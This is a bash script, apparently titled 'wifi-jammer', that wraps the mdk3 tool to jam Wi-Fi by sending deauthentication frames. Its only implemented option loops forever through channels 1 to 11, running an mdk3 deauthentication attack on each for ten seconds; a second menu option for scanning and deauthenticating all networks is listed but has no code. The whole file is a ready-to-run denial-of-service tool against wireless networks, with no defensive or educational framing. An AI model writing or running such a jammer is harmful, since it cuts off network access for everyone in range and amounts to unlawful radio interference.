
#!/bin/bash

red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
clear="\e[0m"

clear

#print banner
printf "
${red}
█░█░█ █ █▀▀ █ ▄▄ ░░█ ▄▀█ █▀▄▀█ █▀▀ █▀█
▀▄▀▄▀ █ █▀░ █ ░░ █▄█ █▀█ █░▀░█ ██▄ █▀▄
${clear}
"

printf "${bold}        Powered by mdk3 project${clear}"
echo ""
echo ""
echo ""
printf "${bold}OPTIONS:${clear}"
echo ""
sleep 0.2s
printf "${bold}1.Send deauthentication frame to all channels${clear}"
echo ""
printf "${bold}2.Scan all wireless networks and send deaathentication frame to all them${clear}"
echo ""
echo ""
echo ""
read -p "Your selection:" sel


if [ $sel -eq 1 ];then
  clear
  echo ""
  printf "${bold}${red}Send deauthentication frame to all channels${clear}"
  sleep 1
  echo ""
  clear
  echo ""
  while true
  do
    echo "Send deauthentication to chanel 1....."
    timeout 10s  mdk3 $1 d -c 1
    clear
    echo "Send deauthentication to chanel 2....."
    timeout 10s  mdk3 $1 d -c 2
    clear
    echo "Send deauthentication to chanel 3....."
    timeout 10s  mdk3 $1 d -c 3
    clear
    echo "Send deauthentication to chanel 4....."
    timeout 10s  mdk3 $1 d -c 4
    clear
    echo "Send deauthentication to chanel 5....."
    timeout 10s  mdk3 $1 d -c 5
    clear
    echo "Send deauthentication to chanel 6....."
    timeout 10s  mdk3 $1 d -c 6
    clear
    echo "Send deauthentication to chanel 7....."
    timeout 10s  mdk3 $1 d -c 7
    clear
    echo "Send deauthentication to chanel 8....."
    timeout 10s  mdk3 $1 d -c 8
    clear
    echo "Send deauthentication to chanel 9....."
    timeout 10s  mdk3 $1 d -c 9
    clear
    echo "Send deauthentication to chanel 10....."
    timeout 10s  mdk3 $1 d -c 10
    clear
    echo "Send deauthentication to chanel 11....."
    timeout 10s  mdk3 $1 d -c 11
    clear
   done
fi
